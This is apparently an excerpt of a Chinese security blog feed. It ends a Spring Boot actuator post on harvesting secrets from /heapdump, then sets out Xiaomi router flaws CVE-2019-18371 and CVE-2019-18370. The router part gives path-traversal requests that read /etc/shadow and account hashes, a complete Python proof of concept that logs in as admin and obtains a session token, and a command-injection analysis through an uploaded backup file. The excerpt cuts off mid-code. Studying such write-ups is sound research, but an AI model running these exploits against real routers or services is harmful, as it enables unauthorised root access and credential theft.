<p>为了获得健康检查中所有指标的详细信息，就需要通过在 application.yaml 中增加如下内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoint:</span></span><br><span class="line">    <span class="attr">health:</span></span><br><span class="line">      <span class="attr">show-details:</span> <span class="string">always</span></span><br></pre></td></tr></table></figure>

<p>一旦打开上述开关，那么在 /health 中可以看到详细内容，比如下面这样</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;status&quot;</span>: <span class="string">&quot;UP&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;diskSpace&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;status&quot;</span>: <span class="string">&quot;UP&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;total&quot;</span>: <span class="number">209715195904</span>,</span><br><span class="line">    <span class="attr">&quot;free&quot;</span>: <span class="number">183253909504</span>,</span><br><span class="line">    <span class="attr">&quot;threshold&quot;</span>: <span class="number">10485760</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="string">&quot;db&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;status&quot;</span>: <span class="string">&quot;UP&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;database&quot;</span>: <span class="string">&quot;MySQL&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hello&quot;</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="k、访问-heapdump或者-actuator-heapdump"><a href="#k、访问-heapdump或者-actuator-heapdump" class="headerlink" title="k、访问/heapdump或者/actuator/heapdump"></a>k、访问/heapdump或者/actuator/heapdump</h4><p>Heap Dump也叫堆转储文件，是一个Java进程在某个时间点上的内存快照</p>
<p>Heap Dump是有着多种类型的，不过总体上heap dump在触发快照的时候都保存了java对象和类的信息</p>
<p>通常在写heap dump文件前会触发一次FullGC，所以heap dump文件中保存的是FullGC后留下的对象信息。其中可能会含有敏感数据，如数据库的密码明文等</p>
<p>直接访问路径会返回一个GZip压缩的JVM堆dump，其中是jvm heap信息。下载的heapdump文件大小通常在 50M—500M 之间，有时候也可能会大于 2G</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675143866116-4bab374b-edb8-4850-afa6-77f3efbc5ae1.png" alt="1675143866116-4bab374b-edb8-4850-afa6-77f3efbc5ae1"></p>
<p>下载完成之后可以借助一些工具对其中的数据进行内容检索，寻找敏感信息</p>
<ul>
<li><a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer（MAT）</a></li>
<li><a href="https://github.com/wyzxxz/heapdump_tool">heapdump_tool</a></li>
<li><a href="https://github.com/whwlsfb/JDumpSpider">JDumpSpider</a></li>
</ul>
<h1 id="四、SpringBoot-Scan的使用"><a href="#四、SpringBoot-Scan的使用" class="headerlink" title="四、SpringBoot-Scan的使用"></a>四、SpringBoot-Scan的使用</h1><p>日常渗透过程中，经常会碰到Spring Boot搭建的微服务，于是就想做一个针对Spring Boot的开源渗透框架</p>
<p>主要用作扫描SpringBoot的敏感信息泄露端点，并可以直接测试Spring Boot的相关高危漏洞。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675143941246-d2b554fb-043c-4948-9d89-536778c8e242.png" alt="1675143941246-d2b554fb-043c-4948-9d89-536778c8e242"></p>
<p>开源地址：<a href="https://github.com/AabyssZG/SpringBoot-Scan">https://github.com/AabyssZG/SpringBoot-Scan</a></p>
<h1 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h1><ul>
<li><a href="https://blog.csdn.net/u012206617/article/details/109010102">https://blog.csdn.net/u012206617/article/details/109010102</a></li>
<li><a href="https://blog.csdn.net/m0_64867220/article/details/121728868">https://blog.csdn.net/m0_64867220/article/details/121728868</a></li>
<li><a href="https://www.freebuf.com/vuls/289710.html">https://www.freebuf.com/vuls/289710.html</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>小米路由器远程命令执行漏洞(CVE-2019-18370，CVE-2019-18371)</title>
    <url>/post/83737637.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、远程任意文件读取漏洞（CVE-2019-18371）"><a href="#一、远程任意文件读取漏洞（CVE-2019-18371）" class="headerlink" title="一、远程任意文件读取漏洞（CVE-2019-18371）"></a>一、远程任意文件读取漏洞（CVE-2019-18371）</h1><h2 id="1、漏洞产生原理"><a href="#1、漏洞产生原理" class="headerlink" title="1、漏洞产生原理"></a>1、漏洞产生原理</h2><p><strong>小米路由器的nginx配置文件错误，导致目录穿越漏洞，实现任意文件读取（无需登录）</strong></p>
<p>nginx配置不当可导致目录穿越漏洞</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> /xxx &#123;</span><br><span class="line">	<span class="attribute">alias</span> /abc/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可通过访问<code>http://domain.cn/xxx../etc/passwd</code>实现目录穿越访问上级目录及其子目录文件。</p>
<p>在小米路由器的文件<code>/etc/sysapihttpd/sysapihttpd.conf</code>中，存在</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> /api-third-party/download/extdisks &#123;</span><br><span class="line">	<span class="attribute">alias</span> /extdisks/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>故可以任意文件读取根目录下的所有文件，而且是root权限，如访问<code>http://192.168.31.1/api-third-party/download/extdisks../etc/shadow</code></p>
<p>类似的问题，存在多处如</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> /backup/log &#123;</span><br><span class="line">	<span class="attribute">alias</span> /tmp/syslogbackup/;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> /api-third-party/download/public &#123;</span><br><span class="line">	<span class="attribute">alias</span> /userdisk/data/;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /api-third-party/download/private &#123;</span><br><span class="line">	<span class="attribute">alias</span> /userdisk/appdata/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2、漏洞利用"><a href="#2、漏洞利用" class="headerlink" title="2、漏洞利用"></a>2、漏洞利用</h2><p><strong>通过任意文件读取，登录路由器后台</strong></p>
<p>不是明文存储密码，进行一定分析。关注两个过程，一是登录时前端js生成http post请求参数过程，二是验证用户登陆的后端过程。</p>
<h3 id="（1）登录时前端js生成HTTP-POST请求参数过程"><a href="#（1）登录时前端js生成HTTP-POST请求参数过程" class="headerlink" title="（1）登录时前端js生成HTTP POST请求参数过程"></a>（1）登录时前端js生成HTTP POST请求参数过程</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646995519930-8d91dfdc-a01c-481b-88da-f9d9bb05645a.png" alt="img"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Encrypt = &#123;</span><br><span class="line">    <span class="attr">key</span>: <span class="string">&#x27;a2ffa5c9be07488bbb04a3a47d3c5f6a&#x27;</span>,</span><br><span class="line">    <span class="attr">iv</span>: <span class="string">&#x27;64175472480004614961023454661220&#x27;</span>,</span><br><span class="line">    <span class="attr">nonce</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">init</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> nonce = <span class="built_in">this</span>.nonceCreat();</span><br><span class="line">        <span class="built_in">this</span>.nonce = nonce;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.nonce;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">nonceCreat</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> type = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 自己的mac地址</span></span><br><span class="line">        <span class="keyword">var</span> deviceId = <span class="string">&#x27;&lt;%=mac%&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">var</span> time = <span class="built_in">Math</span>.floor(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() / <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">var</span> random = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">10000</span>);</span><br><span class="line">        <span class="keyword">return</span> [type, deviceId, time, random].join(<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">oldPwd</span> : <span class="function"><span class="keyword">function</span>(<span class="params">pwd</span>)</span>&#123; <span class="comment">// oldPwd = sha1(nonce + sha1(pwd + &#x27;a2ffa5c9be07488bbb04a3a47d3c5f6a&#x27;))</span></span><br><span class="line">        <span class="keyword">return</span> CryptoJS.SHA1(<span class="built_in">this</span>.nonce + CryptoJS.SHA1(pwd + <span class="built_in">this</span>.key).toString()).toString();</span><br><span class="line">    &#125;,</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可知<code>oldPwd = sha1(nonce + sha1(pwd + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;))</code>，登陆请求包为</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cgi-bin/luci/api/xqsystem/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.31.1</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">username</span>=admin&amp;password=c<span class="number">9</span>e<span class="number">62</span>da<span class="number">7</span>b<span class="number">8</span>a<span class="number">0</span>b<span class="number">7</span>a<span class="number">4918</span>c<span class="number">5</span>a<span class="number">90912</span>ba<span class="number">81</span>a<span class="number">9717</span>f<span class="number">9</span>ab&amp;logtype=<span class="number">2</span>&amp;nonce=<span class="number">0</span>_mac地址_时间戳_<span class="number">5248</span></span></span><br></pre></td></tr></table></figure>

<h3 id="（2）验证用户登录的后端过程"><a href="#（2）验证用户登录的后端过程" class="headerlink" title="（2）验证用户登录的后端过程"></a>（2）验证用户登录的后端过程</h3><p>调用<code>XQSecureUtil.checkUser</code>函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkUser</span><span class="params">(user, nonce, encStr)</span></span></span><br><span class="line">    <span class="comment">-- 从xiaoqiang 配置文件中读取信息</span></span><br><span class="line">    <span class="keyword">local</span> password = XQPreference.get(user, <span class="literal">nil</span>, <span class="string">&quot;account&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> password <span class="keyword">and</span> <span class="keyword">not</span> XQFunction.isStrNil(encStr) <span class="keyword">and</span> <span class="keyword">not</span> XQFunction.isStrNil(nonce) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> XQCryptoUtil.sha1(nonce..password) == encStr <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    XQLog.<span class="built_in">log</span>(<span class="number">4</span>, (luci.http.<span class="built_in">getenv</span>(<span class="string">&quot;REMOTE_ADDR&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)..<span class="string">&quot; Authentication failed&quot;</span>, nonce, password, encStr)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>跟进<code>XQPreference.get</code>函数易知道是从<code>/etc/config/account</code>文件中读取某个字符串，这里称它为<code>accountStr</code>。</p>
<p><code>checkUser</code>函数判断等式为(<code>encStr</code>为参数<code>oldPwd</code>)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sha1(nonce + sha1(密码 + &#x27;a2ffa5c9be07488bbb04a3a47d3c5f6a&#x27;))</span><br><span class="line">==</span><br><span class="line">sha1(nonce + accountStr)</span><br></pre></td></tr></table></figure>

<p>则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">accountStr == sha1(密码 + &#x27;a2ffa5c9be07488bbb04a3a47d3c5f6a&#x27;)</span><br></pre></td></tr></table></figure>

<p>故，只需要读取<code>/etc/config/account</code>得到<code>accountStr</code>即可构造如下数据包登陆</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cgi-bin/luci/api/xqsystem/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.31.1</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">username</span>=admin&amp;password=sha<span class="number">1</span>(nonce + account中保存的字符串)&amp;logtype=<span class="number">2</span>&amp;nonce=<span class="number">0</span>_mac地址_时间戳_<span class="number">5248</span></span></span><br></pre></td></tr></table></figure>

<h2 id="3、实现任意登录POC"><a href="#3、实现任意登录POC" class="headerlink" title="3、实现任意登录POC"></a>3、实现任意登录POC</h2><p>arbitrary_file_read_vulnerability.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span>():</span></span><br><span class="line">	<span class="comment">## get mac</span></span><br><span class="line">	r0 = requests.get(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/web&quot;</span>, proxies=proxies)</span><br><span class="line">	mac = re.findall(<span class="string">r&#x27;deviceId = \&#x27;(.*?)\&#x27;&#x27;</span>, r0.text)[<span class="number">0</span>]</span><br><span class="line">	<span class="comment"># print(mac)	</span></span><br><span class="line">	<span class="keyword">return</span> mac</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_account_str</span>():</span></span><br><span class="line">	<span class="comment">## read /etc/config/account</span></span><br><span class="line">	r1 = requests.get(<span class="string">&quot;http://192.168.31.1/api-third-party/download/extdisks../etc/config/account&quot;</span>, proxies=proxies)</span><br><span class="line">	<span class="built_in">print</span>(r1.text)</span><br><span class="line">	account_str = re.findall(<span class="string">r&#x27;admin\&#x27;? \&#x27;(.*)\&#x27;&#x27;</span>, r1.text)[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">return</span> account_str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_nonce</span>(<span class="params">mac</span>):</span></span><br><span class="line">	type_ = <span class="number">0</span></span><br><span class="line">	deviceId = mac</span><br><span class="line">	time_ = <span class="built_in">int</span>(time.time())</span><br><span class="line">	rand = random.randint(<span class="number">0</span>,<span class="number">10000</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;%d_%s_%d_%d&quot;</span>%(type_, deviceId, time_, rand)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_password</span>(<span class="params">nonce, account_str</span>):</span></span><br><span class="line">	m = hashlib.sha1()</span><br><span class="line">	m.update((nonce + account_str).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">	<span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line">mac = get_mac()</span><br><span class="line">account_str = get_account_str()</span><br><span class="line"><span class="comment">## login, get stok</span></span><br><span class="line">nonce = create_nonce(mac)</span><br><span class="line">password = calc_password(nonce, account_str)</span><br><span class="line">data = <span class="string">&quot;username=admin&amp;password=&#123;password&#125;&amp;logtype=2&amp;nonce=&#123;nonce&#125;&quot;</span>.<span class="built_in">format</span>(password=password,nonce=nonce)</span><br><span class="line">r2 = requests.post(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/api/xqsystem/login&quot;</span>, </span><br><span class="line">	data = data, </span><br><span class="line">	headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&quot;</span>,</span><br><span class="line">		<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;,</span><br><span class="line">	proxies=proxies)</span><br><span class="line"><span class="comment"># print(r2.text)</span></span><br><span class="line">stok = re.findall(<span class="string">r&#x27;&quot;token&quot;:&quot;(.*?)&quot;&#x27;</span>,r2.text)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stok=&quot;</span>+stok)</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646995616699-0347a541-69d8-457d-bbc6-598317039301.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1647248084383-0866a3ea-378f-427d-8076-8d73ac2f12c4.png" alt="img"></p>
<p>可以获取到登录的stok。<img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646996939098-5f628f2c-7c9a-4877-8915-c90e0c01a951.png" alt="img"></p>
<h1 id="二、远程命令执行漏洞（root权限）（CVE-2019-18370）"><a href="#二、远程命令执行漏洞（root权限）（CVE-2019-18370）" class="headerlink" title="二、远程命令执行漏洞（root权限）（CVE-2019-18370）"></a>二、远程命令执行漏洞（root权限）（CVE-2019-18370）</h1><p> 在审计lua代码过程中，发现备份文件是<code>tar.gz</code>格式的，上传后<code>tar -zxf</code>解压，所以构造备份文件，可以控制解压目录的文件内容，结合测试上传下载速度功能的sh脚本执行时读取测试url列表文件，并将url部分直接进行命令拼接执行。</p>
<ol>
<li><strong>备份文件解压导致/tmp/目录任意文件可控</strong></li>
</ol>
<p>在<code>/usr/lib/lua/luci/controller/api/misystem.lua</code>中，配置文件功能如下</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cUpload</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> LuciFs = <span class="built_in">require</span>(<span class="string">&quot;luci.fs&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> XQBackup = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.module.XQBackup&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> code = <span class="number">0</span></span><br><span class="line">    <span class="keyword">local</span> canupload = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">local</span> uploadFilepath = <span class="string">&quot;/tmp/cfgbackup.tar.gz&quot;</span></span><br><span class="line">    <span class="keyword">local</span> fileSize = <span class="built_in">tonumber</span>(LuciHttp.<span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_LENGTH&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> fileSize &gt; <span class="number">102400</span> <span class="keyword">then</span></span><br><span class="line">        canupload = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    LuciHttp.setfilehandler(</span><br><span class="line">        <span class="function"><span class="keyword">function</span><span class="params">(meta, chunk, eof)</span></span></span><br><span class="line">            <span class="keyword">if</span> canupload <span class="keyword">then</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> fp <span class="keyword">then</span></span><br><span class="line">                    <span class="keyword">if</span> meta <span class="keyword">and</span> meta.name == <span class="string">&quot;image&quot;</span> <span class="keyword">then</span></span><br><span class="line">                        fp = <span class="built_in">io</span>.<span class="built_in">open</span>(uploadFilepath, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">                    <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">if</span> chunk <span class="keyword">then</span></span><br><span class="line">                    fp:<span class="built_in">write</span>(chunk)</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">if</span> eof <span class="keyword">then</span></span><br><span class="line">                    fp:<span class="built_in">close</span>()</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                code = <span class="number">1630</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> LuciHttp.formvalue(<span class="string">&quot;image&quot;</span>) <span class="keyword">and</span> fp <span class="keyword">then</span></span><br><span class="line">        code = <span class="number">0</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> result = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> ext = XQBackup.extract(uploadFilepath)</span><br><span class="line">        <span class="keyword">if</span> ext == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">            result[<span class="string">&quot;des&quot;</span>] = XQBackup.getdes()</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            code = <span class="number">1629</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> code ~= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">        result[<span class="string">&quot;msg&quot;</span>] = XQErrorUtil.getErrorMessage(code)</span><br><span class="line">        LuciFs.unlink(uploadFilepath)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    result[<span class="string">&quot;code&quot;</span>] = code</span><br><span class="line">    LuciHttp.write_json(result)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>其中调用<code>XQBackup.extract(uploadFilepath)</code>进行解压</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 0:succeed</span></span><br><span class="line"><span class="comment">-- 1:file does not exist</span></span><br><span class="line"><span class="comment">-- 2:no description file</span></span><br><span class="line"><span class="comment">-- 3:no mbu file</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">extract</span><span class="params">(filepath)</span></span></span><br><span class="line">    <span class="keyword">local</span> fs = <span class="built_in">require</span>(<span class="string">&quot;nixio.fs&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> tarpath = filepath</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tarpath <span class="keyword">then</span></span><br><span class="line">        tarpath = TARMBUFILE</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fs.access(tarpath) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;cd /tmp; tar -xzf &quot;</span>..tarpath..<span class="string">&quot; &gt;/dev/null 2&gt;/dev/null&quot;</span>)</span><br><span class="line">    <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;rm &quot;</span>..tarpath..<span class="string">&quot; &gt;/dev/null 2&gt;/dev/null&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fs.access(DESFILE) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fs.access(MBUFILE) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>可知，<code>/tmp</code>目录下的任意文件可控</p>
<ol start="2">
<li><code>/usr/bin/upload_speedtest</code><strong>，</strong><code>/usr/bin/download_speedtest</code><strong>等会读取</strong><code>/tmp/speedtest_urls.xml</code><strong>并提取url直接进行命令拼接，且这几个脚本可以通过web接口调用</strong></li>
</ol>
<p>举例，查看<code>/usr/bin/download_speedtest</code>文件</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env lua</span><br><span class="line"><span class="comment">-- ...</span></span><br><span class="line"><span class="keyword">local</span> cfg = &#123;</span><br><span class="line"><span class="comment">-- ...</span></span><br><span class="line">	[<span class="string">&#x27;xmlfile&#x27;</span>] = <span class="string">&quot;/usr/share/speedtest.xml&quot;</span>,</span><br><span class="line">        [<span class="string">&#x27;tmp_speedtest_xml&#x27;</span>] = <span class="string">&quot;/tmp/speedtest_urls.xml&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">VERSION=<span class="string">&quot;__UNDEFINED__&quot;</span></span><br><span class="line"><span class="comment">-- ...</span></span><br><span class="line"><span class="comment">-- 测试网速使用的url文件为，若存在/tmp/speedtest_urls.xml则使用，否则用/usr/share/speedtest.xml</span></span><br><span class="line"><span class="keyword">local</span> filename = <span class="string">&quot;&quot;</span></span><br><span class="line">filexml = <span class="built_in">io</span>.<span class="built_in">open</span>(cfg.tmp_speedtest_xml)</span><br><span class="line"><span class="keyword">if</span> filexml <span class="keyword">then</span></span><br><span class="line">    filexml:<span class="built_in">close</span>()</span><br><span class="line">    filename = cfg.tmp_speedtest_xml</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    filename = cfg.xmlfile</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> pp = <span class="built_in">io</span>.<span class="built_in">open</span>(filename)</span><br><span class="line"><span class="keyword">local</span> line = pp:<span class="built_in">read</span>(<span class="string">&quot;*line&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> size = <span class="number">0</span></span><br><span class="line"><span class="keyword">local</span> resources = &#123;&#125;</span><br><span class="line"><span class="keyword">local</span> u = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">local</span> pids = &#123;&#125;</span><br><span class="line"><span class="comment">-- ...</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wget_work</span><span class="params">(url)</span></span></span><br><span class="line">	<span class="keyword">local</span> _url = url</span><br><span class="line">	pid = posix.fork()</span><br><span class="line">	<span class="keyword">if</span> pid &lt; <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;fork error&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">	<span class="keyword">elseif</span> pid &gt; <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">		<span class="comment">--print(string.format(&quot;child pid %d\n&quot;, pid))</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">        <span class="comment">-- 拼接命令，最终在这里执行</span></span><br><span class="line">		<span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&#x27;for i in $(seq &#x27;</span>.. <span class="built_in">math</span>.<span class="built_in">floor</span>(cfg.nr/cfg.nc) ..<span class="string">&#x27;); do wget &#x27;</span>.. url  ..</span><br><span class="line">		<span class="string">&quot; -q -O /dev/null; done&quot;</span>)</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">	<span class="keyword">return</span> pid</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> line <span class="keyword">do</span></span><br><span class="line">    <span class="comment">-- 从文件中提取url， 这里提取没有进行过滤</span></span><br><span class="line">	<span class="keyword">local</span> _, _, url = <span class="built_in">string</span>.<span class="built_in">find</span>(line,<span class="string">&#x27;&lt;item url=&quot;(.*)&quot;/&gt;&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> url <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">table</span>.<span class="built_in">insert</span>(resources, url)</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">	line = pp:<span class="built_in">read</span>(<span class="string">&quot;*line&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">pp:<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> urls = mrandom(<span class="number">1</span>, <span class="built_in">table</span>.<span class="built_in">getn</span>(resources), cfg.nc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">ipairs</span>(urls) <span class="keyword">do</span></span><br><span class="line">	<span class="keyword">if</span> VERSION == <span class="string">&quot;LESSMEM&quot;</span> <span class="keyword">then</span></span><br><span class="line">		<span class="keyword">local</span> pid = wget_work_loop(resources[v])</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">        <span class="comment">-- VERSION 为 __UNDEFINED__， url直接作为参数</span></span><br><span class="line">		<span class="keyword">local</span> pid = wget_work(resources[v])</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">os</span>.<span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line">	<span 